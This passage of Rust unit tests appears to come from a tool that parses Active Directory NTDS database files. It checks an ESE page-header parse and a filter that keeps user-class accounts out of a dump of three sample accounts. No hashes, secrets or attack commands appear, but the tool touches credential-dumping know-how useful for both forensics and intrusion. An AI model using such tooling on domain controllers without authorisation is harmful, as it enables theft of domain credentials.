        let hdr = PageHeader::parse(&page, 0x620, 0x14, 8192).expect("header");
        assert_eq!(hdr.size, 40);
        assert_eq!(hdr.previous_page, 3);
        assert_eq!(hdr.next_page, 5);
        assert_eq!(hdr.father_data_page, 9);
        assert_eq!(hdr.tag_count, 7);
        assert!(hdr.is_leaf());
    }

    #[test]
    fn user_class_account_filter() {
        let mut dump = NtdsDump::default();
        dump.accounts.push(NtdsAccount {
            sam_account: Some("alice".into()),
            sam_account_type: Some(0x30000000),
            ..Default::default()
        });
        dump.accounts.push(NtdsAccount {
            sam_account: Some("DC01$".into()),
            sam_account_type: Some(0x30000001),
            ..Default::default()
        });
        dump.accounts.push(NtdsAccount {
            sam_account: Some("domain-users".into()),
            sam_account_type: Some(0x10000000),
            ..Default::default()
        });
        let users: Vec<_> = filter_user_accounts(&dump).collect();
        assert_eq!(users.len(), 2);
    }
}
